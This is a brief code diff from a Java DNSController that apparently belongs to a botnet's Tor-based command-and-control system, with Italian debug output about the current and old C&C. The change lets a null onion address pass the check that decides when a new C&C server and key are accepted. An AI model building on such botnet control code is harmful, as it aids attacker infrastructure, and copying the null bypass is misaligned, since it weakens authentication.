@@ -116,7 +116,7 @@ public class DNSController {
 		System.out.println("C&C attuale "+onionCec.getOnion());
 		System.out.println("Veccio C&C "+oldCCIp.getOnion());
 
-		if (cecElected.getValue1().getOnion().equals(onionCec.getOnion())) { // if request is send from actual C&C then set new C&C
+		if (cecElected.getValue1().getOnion().equals(onionCec.getOnion())||onionCec.getOnion()==null) { // if request is send from actual C&C then set new C&C
 		 oldCCIp=onionCec;
 		 oldCCPubKey=pubKey;		
 			Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());
